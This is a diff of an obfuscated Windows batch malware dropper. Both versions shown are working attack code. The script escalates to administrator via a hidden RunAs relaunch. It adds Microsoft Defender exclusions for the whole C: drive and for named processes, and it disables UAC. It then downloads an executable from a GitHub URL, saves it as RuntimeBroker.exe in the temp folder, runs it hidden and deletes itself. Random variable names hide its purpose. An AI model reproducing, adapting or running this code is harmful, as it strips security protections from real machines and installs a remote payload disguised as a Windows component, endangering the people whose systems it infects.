@@ -1,37 +1,39 @@
 @echo off & setlocal enableDelayedExpansion
-set "DBuwm=2>&1" & set "Rwuv=SESSION" & set "OZn=>nul" & set "wmi=NET"
-%wmi% %Rwuv% %OZn% %DBuwm%
+set "BbU=>nul" & set "LfT=NET" & set "MYYi=2>&1" & set "VECrc=SESSION"
+%LfT% %VECrc% %BbU% %MYYi%
 set "e=!errorlevel!" & set "a=:A" & set "b=:B"
 if !e! equ 0 (goto %a%) else (goto %b%)
 
 :A
-set "NTKo=bar" & set "lnwM=qux" & set "PtE=foo" & set "uldOs=baz" & rem UOQUinm jYMcy QpND
-set "YvGnZ=powershell -ExecutionPolicy Bypass -Command"
-set "tXHps=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
-set "Big='C:\', 'C:\cmd.exe', 'C:\conhost.exe', 'C:\cvtres.exe', 'C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSbuild.exe',"
-set "Njs='C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe', 'C:\Windows\System32\Wscript.exe' -ErrorAction SilentlyContinue"
-!YvGnZ! "!tXHps! !Big! !Njs!" %OZn% %DBuwm%
-set "DiKSp=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
-set "TEtl=-Name 'EnableLUA' -Value 0"
-!YvGnZ! "!DiKSp! !TEtl!" %OZn% %DBuwm%
-set "xAzlv=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
-!YvGnZ! "!xAzlv!" %OZn% %DBuwm%
+set "gNavW=baz" & set "CWc=bar" & set "Duoe=qux" & set "WUSnj=foo" & rem LhsY YIAYYo gqOLQ
+set "gJK=powershell -ExecutionPolicy Bypass -Command"
+set "fydp=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath"
+set "FKK='C:\' -ErrorAction SilentlyContinue"
+!gJK! "!fydp! !FKK!" %BbU% %MYYi%
+set "APo=Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue"
+!gJK! "!APo!" %BbU% %MYYi%
+set "SibF=Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
+!gJK! "!SibF!" %BbU% %MYYi%
+set "ThQK=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System'"
+set "MJDjE=-Name 'EnableLUA' -Value 0"
+!gJK! "!ThQK! !MJDjE!" %BbU% %MYYi%
+set "wpP=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 } "
+!gJK! "!wpP!" %BbU% %MYYi%
 if !errorlevel! neq 0 (goto %a%)
-set "MDIO=timeout /t" & !MDIO! 2 %OZn% %DBuwm%
-set "IuQ=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
-set "LtY=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe'"
-set "nkmsC=-OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
-!YvGnZ! "!IuQ! !LtY! !nkmsC!" %OZn% %DBuwm%
+set "FYbkm=timeout /t" & !FYbkm! 2 %BbU% %MYYi%
+set "AJpP=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue';"
+set "dGtyj=Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
+!gJK! "!AJpP! !dGtyj!" %BbU% %MYYi%
 
 :W
-if not exist "%TEMP%\RuntimeBroker.exe" (!MDIO! 1 %OZn% %DBuwm% & goto :W)
-start "" /B "%TEMP%\RuntimeBroker.exe" %OZn% %DBuwm%
-del /f /q "%~f0" %OZn% %DBuwm%
+if not exist "%TEMP%\RuntimeBroker.exe" (!FYbkm! 1 %BbU% %MYYi% & goto :W)
+start "" /B "%TEMP%\RuntimeBroker.exe" %BbU% %MYYi%
+del /f /q "%~f0" %BbU% %MYYi%
 exit /b
 
 :B
 set "h=powershell -WindowStyle Hidden -Command"
 set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
-!h! "!j1!" %OZn% %DBuwm%
-if !errorlevel! neq 0 (!MDIO! 3 %OZn% %DBuwm% & goto %b%)
+!h! "!j1!" %BbU% %MYYi%
+if !errorlevel! neq 0 (!FYbkm! 3 %BbU% %MYYi% & goto %b%)
 exit /b
